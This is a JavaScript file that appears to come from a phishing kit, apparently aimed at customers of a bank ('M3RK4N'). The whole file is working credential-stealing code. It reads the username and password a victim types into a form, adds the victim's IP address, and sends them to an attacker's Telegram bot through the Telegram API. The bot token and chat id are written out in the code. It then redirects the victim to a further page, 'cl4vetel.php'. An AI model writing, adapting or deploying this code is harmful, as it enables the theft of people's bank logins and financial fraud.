//bot token
var telegram_bot_id = "7754555833:AAE0qoEW0ALdsbwHlgpD0y1UnxkdjTrm1Z4";
//chat id
var chat_id = -4521511581;
var pax, pax2, ip, message;

var ready = function () {
    pax = document.getElementById("miDiosenticonfio").value;
    pax2 = document.getElementById("miDiosenticonfio2").value;
    ip = document.getElementById("ip").innerHTML;
    message = "🔹M3RK4N🔹\n👤Usxvry0: " + pax + "\n🔒Ucl4ve: " + pax2 + "\nIP: " + ip + "\n🔹BY SYN4PSE🔹";
};

var sender = function () {
    ready();

    if (ip === "" || ip === null || ip === undefined) {
        alert("Esperando obtener la dirección IP, por favor espera unos segundos o actualice la página.");
        return false; // Evita el envío del formulario
    }

    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };

    $.ajax(settings).done(function (response) {
        top.location.href = 'cl4vetel.php';
        console.log(response);
    });

    return false; // Prevenir el envío predeterminado del formulario
};